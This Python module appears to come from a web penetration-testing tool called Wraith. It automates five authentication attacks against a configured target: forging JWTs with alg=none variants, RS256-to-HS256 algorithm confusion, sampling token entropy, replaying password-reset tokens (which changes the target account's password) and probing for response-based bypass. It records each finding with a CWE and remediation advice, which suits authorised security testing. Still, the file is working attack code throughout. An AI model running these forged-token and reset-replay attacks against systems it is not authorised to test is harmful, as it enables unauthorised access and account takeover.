"""
wraith/core/auth_tester.py
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Phase 2 – Authentication Tester

Covers every auth-layer attack in the spec:
  1. JWT none-alg bypass
  2. JWT algorithm confusion (RS256 → HS256)
  3. Token predictability / entropy check
  4. Password reset token reuse
  5. Response-based auth bypass (status/body manipulation)

How it fits in the project:
  - Receives an AuthTarget config describing the target's auth endpoints
  - Uses SpecterSession (http_client.py) for all requests
  - Uses TokenAnalyzer (token_analyzer.py) to inspect tokens it encounters
  - Returns a list of ScanFinding objects (models/findings.py) for the reporter

Usage (standalone):
    from core.auth_tester import AuthTester, AuthTarget
    from utils.http_client import make_session

    session = make_session(use_proxy=True)   # route through Burp
    target  = AuthTarget(
        base_url        = "https://target.com",
        login_endpoint  = "/api/auth/login",
        login_body      = '{"username":"admin","password":"admin"}',
        login_token_field = "token",         # JSON key that holds the JWT/session token
        reset_endpoint  = "/api/auth/reset-password",
        protected_endpoint = "/api/me",
    )
    tester   = AuthTester(session, target)
    findings = tester.run_all()
"""

from __future__ import annotations

import json
import time
import re
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional

# ── internal imports ────────────────────────────────────────────────────────
from utils.http_client import SpecterSession, HttpRequest, HttpResponse
from utils.token_analyzer import TokenAnalyzer, TokenType, Severity as TokenSeverity
from models.findings import ScanFinding, Severity, Category


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Configuration dataclass – describe the target's auth surface here
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@dataclass
class AuthTarget:
    """
    Everything AuthTester needs to know about the target's auth layer.
    Fill in only what's relevant — unused fields are safely ignored.
    """

    # ── core ────────────────────────────────────────────────────────────────
    base_url: str                          # e.g. "https://api.target.com"

    # ── login endpoint ──────────────────────────────────────────────────────
    login_endpoint:     str  = "/login"    # path for the login POST
    login_body:         str  = ""          # raw JSON body sent to login
    login_content_type: str  = "application/json"

    # Where to extract the issued token from a successful login response.
    # Supports: JSON key path like "data.token", or cookie name like "cookie:session"
    login_token_field:  str  = "token"

    # ── protected endpoint (used to verify if a forged token works) ─────────
    protected_endpoint: str  = "/api/me"   # must return 200 for authenticated users

    # ── password reset endpoints ─────────────────────────────────────────────
    reset_endpoint:     str  = ""          # e.g. "/forgot-password"
    reset_confirm_endpoint: str = ""       # e.g. "/reset-password"  (where token is submitted)
    reset_email_field:  str  = "email"     # body field name for the email address
    reset_test_email:   str  = ""          # a real inbox you control for reset testing

    # ── algorithm confusion ──────────────────────────────────────────────────
    # If the app uses RS256, paste the public key PEM here to attempt HS256 confusion
    public_key_pem:     str  = ""

    # ── extra headers sent with every request (e.g. API version headers) ────
    extra_headers: Dict[str, str] = field(default_factory=dict)

    # ── callbacks ────────────────────────────────────────────────────────────
    # Optional hook: given a response, return the next token string (for custom extraction logic)
    token_extractor: Optional[Callable[[HttpResponse], Optional[str]]] = None


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AuthTester – main class
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class AuthTester:
    """
    Runs all auth-layer attack checks against a configured target.

    Each check is an independent method prefixed with `check_`.
    run_all() calls every check and aggregates the findings.
    Individual checks can also be called directly for targeted testing.
    """

    def __init__(self, session: SpecterSession, target: AuthTarget):
        self.session  = session
        self.target   = target
        self.analyzer = TokenAnalyzer()      # token analysis engine from Phase 1
        self.findings: List[ScanFinding] = []

        # Cache the valid token obtained from login so we don't re-login on every check
        self._valid_token:    Optional[str] = None
        self._valid_response: Optional[HttpResponse] = None

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # Public entry points
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    def run_all(self) -> List[ScanFinding]:
        """
        Run every auth check in sequence.
        Safe to call multiple times — findings list is reset on each call.
        """
        self.findings = []

        # Step 1: perform a real login to get a valid token we can manipulate
        print("[*] Auth Phase — logging in to obtain valid token...")
        self._valid_token    = self._do_login()
        self._valid_response = self.session.history[-1] if self.session.history else None

        if not self._valid_token:
            # Can't run JWT/token checks without a token — still try response-bypass
            print("[!] Login failed or token not found — limited checks only")
        else:
            print(f"[+] Token obtained: {self._valid_token[:40]}...")

        # Run each check — each appends to self.findings internally
        checks = [
            ("JWT None-Alg Bypass",        self.check_jwt_none_alg),
            ("JWT Algorithm Confusion",     self.check_jwt_alg_confusion),
            ("Token Predictability",        self.check_token_predictability),
            ("Password Reset Token Reuse",  self.check_password_reset_reuse),
            ("Response-Based Auth Bypass",  self.check_response_bypass),
        ]

        for name, fn in checks:
            print(f"[*] Running: {name}")
            try:
                fn()
            except Exception as e:
                # Never let one check crash the whole run
                print(f"[!] {name} raised an exception: {e}")
                self._add_finding(
                    title       = f"Check Error: {name}",
                    severity    = Severity.INFO,
                    description = f"Check threw an unexpected exception: {e}",
                    evidence    = {"exception": str(e)},
                )

        print(f"[+] Auth phase complete — {len(self.findings)} findings")
        return self.findings

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # Check 1 — JWT None-Algorithm Bypass
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    def check_jwt_none_alg(self):
        """
        Forges the valid JWT with alg=none and an empty signature,
        then sends it to the protected endpoint.

        Vulnerable if the server returns 200 (or the same body as a valid request).

        Variants tried:
          - alg: "none"
          - alg: "None"   (case variations some libs accept)
          - alg: "NONE"
          - alg: "nOnE"
        """
        if not self._valid_token:
            return

        # Only applicable to JWTs
        if not self._is_jwt(self._valid_token):
            return

        # Try multiple case variants — some JWT libraries do case-insensitive matching
        none_variants = ["none", "None", "NONE", "nOnE"]

        for variant in none_variants:
            # forge_none_alg returns a token with the chosen alg and empty signature
            forged = self.analyzer.forge_none_alg(self._valid_token)
            if not forged:
                continue

            # Manually patch the alg value to each case variant
            forged = self._patch_jwt_alg(forged, variant)

            # Send forged token to the protected endpoint
            resp = self._send_with_token(forged, self.target.protected_endpoint)

            if self._is_auth_success(resp):
                self._add_finding(
                    title       = "JWT None-Algorithm Bypass",
                    severity    = Severity.CRITICAL,
                    description = (
                        f"Server accepted a JWT with alg='{variant}' and no signature. "
                        "An attacker can forge arbitrary claims (role, user ID, etc.) "
                        "without knowing the signing secret."
                    ),
                    evidence    = {
                        "forged_token":   forged,
                        "alg_variant":    variant,
                        "response_status": resp.status_code,
                        "response_snippet": resp.body[:300],
                    },
                    cwe         = 347,
                    remediation = (
                        "Explicitly reject tokens where alg=none. "
                        "Use an allowlist of accepted algorithms server-side."
                    ),
                    request  = resp.request,
                    response = resp,
                    tags     = ["jwt", "none-alg", "auth-bypass"],
                )
                # Found one — no need to try more variants
                return

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # Check 2 — JWT Algorithm Confusion (RS256 → HS256)
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    def check_jwt_alg_confusion(self):
        """
        If the app uses RS256, attempts to downgrade to HS256 by signing
        the token with the server's public key as the HMAC secret.

        This works when the server doesn't enforce the algorithm and
        naively verifies using whatever alg the token header declares.

        Requires: target.public_key_pem to be set.
        """
        if not self._valid_token or not self.target.public_key_pem:
            return

        if not self._is_jwt(self._valid_token):
            return

        # forge_alg_confusion: changes header alg to HS256, signs with public key as HMAC secret
        forged = self.analyzer.forge_alg_confusion(
            self._valid_token,
            self.target.public_key_pem,
        )
        if not forged:
            return

        resp = self._send_with_token(forged, self.target.protected_endpoint)

        if self._is_auth_success(resp):
            self._add_finding(
                title       = "JWT Algorithm Confusion (RS256 → HS256)",
                severity    = Severity.CRITICAL,
                description = (
                    "Server accepted an HS256-signed token where the HMAC secret "
                    "is the RS256 public key. An attacker who knows the public key "
                    "(often publicly available) can forge any JWT payload."
                ),
                evidence    = {
                    "forged_token":    forged[:80] + "...",
                    "response_status": resp.status_code,
                },
                cwe         = 347,
                remediation = (
                    "Enforce a strict algorithm allowlist. Never accept HS* tokens "
                    "on endpoints configured for RS*/ES* verification."
                ),
                request  = resp.request,
                response = resp,
                tags     = ["jwt", "alg-confusion", "auth-bypass"],
            )

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # Check 3 — Token Predictability
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    def check_token_predictability(self):
        """
        Performs multiple logins and compares the issued tokens to detect:
          - Low entropy (weak PRNG)
          - Common prefix (timestamp-seeded generation)
          - Sequential / numeric tokens

        Batch analysis is handled by TokenAnalyzer.analyze_batch() from Phase 1.
        """
        sample_size = 5   # number of tokens to collect for comparison

        tokens: List[str] = []
        for i in range(sample_size):
            t = self._do_login()
            if t:
                tokens.append(t)
            # Small delay to avoid rate limiting; also reveals time-based patterns
            time.sleep(0.3)

        if len(tokens) < 2:
            return   # not enough samples to compare

        # Hand off to the batch analyzer — it checks entropy variance and common prefix
        analyses = self.analyzer.analyze_batch(tokens, context="session_cookie")

        # Deduplicate findings across analyses — analyze_batch appends cross-token
        # findings to every TokenAnalysis object, so iterating all N analyses would
        # emit N identical findings. Collect unique findings by title instead.
        seen_titles: set = set()
        for analysis in analyses:
            for finding in analysis.findings:
                if finding.title in seen_titles:
                    continue
                seen_titles.add(finding.title)
                sev = Severity(finding.severity.value)
                self._add_finding(
                    title       = f"Token Predictability: {finding.title}",
                    severity    = sev,
                    description = finding.description,
                    evidence    = {
                        **finding.evidence,
                        "sample_tokens": [t[:20] + "..." for t in tokens],
                        "sample_size":   len(tokens),
                    },
                    cwe         = finding.cwe or 330,
                    remediation = finding.remediation,
                    tags        = ["token", "predictability", "entropy"],
                )

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # Check 4 — Password Reset Token Reuse
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    def check_password_reset_reuse(self):
        """
        Tests whether a password reset token can be used more than once.

        Attack flow:
          1. Request a reset token (endpoint 1 — trigger email)
          2. Use the token to reset the password (endpoint 2 — consume token)
          3. Immediately try to use the SAME token again
          4. If step 3 succeeds → token is not invalidated after use

        Requires: target.reset_endpoint, target.reset_confirm_endpoint,
                  target.reset_test_email to be configured.
        """
        if not (self.target.reset_endpoint and
                self.target.reset_confirm_endpoint and
                self.target.reset_test_email):
            return   # not configured — skip silently

        # Step 1: trigger reset email
        trigger_resp = self._post(
            self.target.reset_endpoint,
            body = json.dumps({self.target.reset_email_field: self.target.reset_test_email}),
        )

        # We can't read the email here — the tester must supply the token
        # via the token_extractor callback or the finding is informational only.
        reset_token = None
        if self.target.token_extractor:
            reset_token = self.target.token_extractor(trigger_resp)

        if not reset_token:
            # Can't automate without the token — flag for manual follow-up
            self._add_finding(
                title       = "Password Reset Token Reuse — Manual Verification Required",
                severity    = Severity.INFO,
                description = (
                    "Reset endpoint responded but the token could not be extracted automatically. "
                    "Manually use the token, then replay the same request to check for reuse."
                ),
                evidence    = {
                    "reset_endpoint":   self.target.reset_endpoint,
                    "trigger_status":   trigger_resp.status_code,
                },
                tags = ["reset", "token-reuse", "manual"],
            )
            return

        # Step 2: use the token (first use — should succeed)
        new_password = "Wraith_Test_P@ss1"
        use_resp_1 = self._post(
            self.target.reset_confirm_endpoint,
            body = json.dumps({"token": reset_token, "password": new_password}),
        )

        # Step 3: replay the same token (second use — should fail on a secure app)
        use_resp_2 = self._post(
            self.target.reset_confirm_endpoint,
            body = json.dumps({"token": reset_token, "password": new_password}),
        )

        # If both uses succeed (non-error status), the token was not invalidated
        first_ok  = use_resp_1.status_code < 400
        second_ok = use_resp_2.status_code < 400

        if first_ok and second_ok:
            self._add_finding(
                title       = "Password Reset Token Not Invalidated After Use",
                severity    = Severity.HIGH,
                description = (
                    "The reset token was accepted on a second submission after already being used. "
                    "An attacker who intercepts or leaks the reset link can replay it later."
                ),
                evidence    = {
                    "reset_token":        reset_token[:20] + "...",
                    "first_use_status":   use_resp_1.status_code,
                    "second_use_status":  use_resp_2.status_code,
                },
                cwe         = 613,
                remediation = (
                    "Invalidate reset tokens immediately after first successful use. "
                    "Also enforce a short expiry (e.g., 15 minutes)."
                ),
                request  = use_resp_2.request,
                response = use_resp_2,
                tags     = ["reset", "token-reuse", "session"],
            )

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # Check 5 — Response-Based Auth Bypass
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    def check_response_bypass(self):
        """
        Detects apps that make auth decisions based on the response body
        rather than server-side session state.

        Common patterns in vulnerable apps:
          - Response body contains "success":false but frontend trusts it anyway
          - 401 response with a body field like "authenticated":true that a proxy intercept
            can flip
          - Status code 200 returned even on failed login (body-based failure)

        This check is largely observational — it flags the pattern for Burp manual testing
        rather than being fully automated (you can't auto-intercept your own responses).
        """
        if not self.target.login_body:
            return

        # Attempt login with deliberately wrong credentials
        bad_body = self._inject_bad_credentials(self.target.login_body)
        resp = self._post(
            self.target.login_endpoint,
            body = bad_body,
            headers = {"Content-Type": self.target.login_content_type},
        )

        # ── Pattern 1: 200 OK on failed login ──────────────────────────────
        # A 200 with a failed login body is a Burp-intercept target —
        # changing "false" to "true" in the response may bypass auth.
        if resp.status_code == 200:
            body_lower = resp.body.lower()
            failure_keywords = ["invalid", "incorrect", "wrong", "failed", "error", "denied"]
            has_failure_word = any(k in body_lower for k in failure_keywords)

            if has_failure_word:
                self._add_finding(
                    title       = "Potential Response-Based Auth Bypass (200 on Failed Login)",
                    severity    = Severity.MEDIUM,
                    description = (
                        "Failed login returns HTTP 200 with a failure indicator in the body. "
                        "If the client makes auth decisions based on the response body rather than "
                        "the server session, intercepting and modifying the response may bypass auth."
                    ),
                    evidence    = {
                        "login_endpoint": self.target.login_endpoint,
                        "status_code":    resp.status_code,
                        "body_snippet":   resp.body[:400],
                    },
                    cwe         = 287,
                    remediation = (
                        "Server should return 401 on failed login, not 200. "
                        "Auth state must be maintained server-side — never trust client-sent success flags."
                    ),
                    request  = resp.request,
                    response = resp,
                    tags     = ["auth-bypass", "response-manipulation"],
                )

        # ── Pattern 2: JSON body contains auth-flavoured boolean fields ─────
        # e.g. {"success": false, "authenticated": false, "isAdmin": false}
        # These are prime targets for Burp response intercept tampering.
        if resp.is_json:
            try:
                body_json = resp.json()
                suspicious = self._find_auth_booleans(body_json)
                if suspicious:
                    self._add_finding(
                        title       = "Auth-Sensitive Boolean Fields in Login Response",
                        severity    = Severity.LOW,
                        description = (
                            "The login response contains boolean fields with auth-related names. "
                            "If the client trusts these values, flipping them via a proxy intercept "
                            "may grant unauthorised access."
                        ),
                        evidence    = {
                            "suspicious_fields": suspicious,
                            "status_code":       resp.status_code,
                        },
                        cwe         = 287,
                        remediation = (
                            "Never make server-side auth decisions based on values "
                            "that could be tampered with in transit. Use server-held session state."
                        ),
                        tags = ["auth-bypass", "response-manipulation", "json"],
                    )
            except (json.JSONDecodeError, ValueError):
                pass

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # Internal helpers — login, request sending, token extraction
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    def _do_login(self) -> Optional[str]:
        """
        Performs a login POST and returns the extracted token string.
        Returns None if login fails or the token can't be found.
        """
        if not self.target.login_body:
            return None

        resp = self._post(
            self.target.login_endpoint,
            body    = self.target.login_body,
            headers = {"Content-Type": self.target.login_content_type},
        )

        # Try the custom extractor first (user-supplied lambda)
        if self.target.token_extractor:
            return self.target.token_extractor(resp)

        # Otherwise use the built-in extraction logic
        return self._extract_token(resp, self.target.login_token_field)

    def _extract_token(self, resp: HttpResponse, field_path: str) -> Optional[str]:
        """
        Extracts a token from a response using a field path string.

        Supported formats:
          - "token"           → resp.json()["token"]
          - "data.token"      → resp.json()["data"]["token"]
          - "cookie:session"  → resp.headers["Set-Cookie"] matching 'session=...'
        """
        # ── Cookie extraction ───────────────────────────────────────────────
        if field_path.startswith("cookie:"):
            cookie_name = field_path.split(":", 1)[1]
            set_cookie  = resp.header("Set-Cookie") or ""
            match = re.search(rf"{re.escape(cookie_name)}=([^;]+)", set_cookie)
            return match.group(1) if match else None

        # ── JSON dot-path extraction ────────────────────────────────────────
        if resp.is_json:
            try:
                data = resp.json()
                # Walk the dot-separated path: "data.user.token" → data["data"]["user"]["token"]
                for key in field_path.split("."):
                    if isinstance(data, dict):
                        data = data.get(key)
                    else:
                        return None
                return str(data) if data else None
            except (json.JSONDecodeError, AttributeError):
                pass

        # ── Fallback: look for a bare JWT in the response body ──────────────
        # Matches anything that looks like xxx.yyy.zzz (JWT pattern)
        jwt_pattern = r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*"
        match = re.search(jwt_pattern, resp.body)
        return match.group(0) if match else None

    def _send_with_token(self, token: str, endpoint: str) -> HttpResponse:
        """
        Sends a GET to the given endpoint with the token injected as:
          - Authorization: Bearer header  (for JWTs)
          - Cookie: token=...             (for opaque tokens)
        Detects which injection method to use based on token type.
        """
        headers = {**self.target.extra_headers}

        if self._is_jwt(token):
            headers["Authorization"] = f"Bearer {token}"
        else:
            # Opaque token — try both cookie and Authorization header
            headers["Authorization"] = f"Bearer {token}"
            headers["Cookie"]        = f"token={token}; session={token}"

        return self.session.send(HttpRequest(
            method  = "GET",
            url     = self.target.base_url + endpoint,
            headers = headers,
        ))

    def _post(self, endpoint: str, body: str = "", headers: Optional[Dict] = None) -> HttpResponse:
        """Shorthand POST to the target's base URL."""
        merged = {**self.target.extra_headers, **(headers or {})}
        return self.session.send(HttpRequest(
            method  = "POST",
            url     = self.target.base_url + endpoint,
            headers = merged,
            body    = body,
        ))

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # Internal helpers — analysis utilities
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    def _is_auth_success(self, resp: HttpResponse) -> bool:
        """
        Heuristic: returns True if the response looks like a successful
        authenticated response. Used to evaluate forged token effectiveness.

        Checks:
          - Status is 200
          - Body doesn't contain common 401/403 error phrases
        """
        if resp.status_code != 200:
            return False

        body_lower = resp.body.lower()
        rejection_patterns = [
            "unauthorized", "unauthenticated", "invalid token",
            "access denied", "forbidden", "not allowed", "signature",
            "expired", "invalid signature",
        ]
        return not any(p in body_lower for p in rejection_patterns)

    def _is_jwt(self, token: str) -> bool:
        """Quick check: does this string look like a JWT (3 dot-separated base64 segments)?"""
        return token.count(".") == 2 and token.startswith("eyJ")

    def _patch_jwt_alg(self, token: str, alg_value: str) -> str:
        """
        Replaces the alg field in a JWT header with the given value.
        Used to generate case-variant none-alg tokens for fuzzing.
        """
        import base64 as _b64
        parts = token.split(".")
        if len(parts) != 3:
            return token
        try:
            padding = 4 - len(parts[0]) % 4
            header = json.loads(_b64.urlsafe_b64decode(parts[0] + "=" * (padding % 4)))
            header["alg"] = alg_value
            new_header = _b64.urlsafe_b64encode(
                json.dumps(header, separators=(",", ":")).encode()
            ).rstrip(b"=").decode()
            return f"{new_header}.{parts[1]}."
        except Exception:
            return token

    def _inject_bad_credentials(self, body: str) -> str:
        """
        Replaces password value in a JSON login body with a known-wrong value.
        Used for the response-bypass check to deliberately trigger a failed login.
        """
        try:
            data = json.loads(body)
            # Look for common password field names and corrupt the value
            for field in ("password", "pass", "passwd", "secret", "credential"):
                if field in data:
                    data[field] = "Wraith_INVALID_" + str(int(time.time()))
                    break
            return json.dumps(data)
        except (json.JSONDecodeError, TypeError):
            # Not JSON — just append garbage to the raw body
            return body + "&password=INVALID_SPECTER"

    def _find_auth_booleans(self, obj: Any, path: str = "") -> Dict[str, Any]:
        """
        Recursively walks a JSON object and collects boolean fields
        whose names suggest auth relevance (success, authenticated, isAdmin, etc.).
        """
        # Keywords that suggest a boolean might control auth state
        auth_keywords = {
            "success", "authenticated", "authorized", "isadmin", "admin",
            "isloggedin", "loggedin", "valid", "verified", "active",
        }
        results = {}

        if isinstance(obj, dict):
            for k, v in obj.items():
                full_path = f"{path}.{k}" if path else k
                if isinstance(v, bool) and k.lower().replace("_", "") in auth_keywords:
                    results[full_path] = v
                elif isinstance(v, dict):
                    results.update(self._find_auth_booleans(v, full_path))
        return results

    def _add_finding(
        self,
        title:       str,
        severity:    Severity,
        description: str,
        evidence:    Optional[Dict[str, Any]] = None,
        cwe:         Optional[int]            = None,
        remediation: str                      = "",
        request:     Any                      = None,
        response:    Any                      = None,
        tags:        Optional[List[str]]      = None,
    ):
        """Central helper — constructs a ScanFinding and appends it to self.findings."""
        self.findings.append(ScanFinding(
            title       = title,
            severity    = severity,
            category    = Category.AUTH,
            description = description,
            evidence    = evidence or {},
            cwe         = cwe,
            remediation = remediation,
            request     = request,
            response    = response,
            phase       = "auth",
            tags        = tags or [],
        ))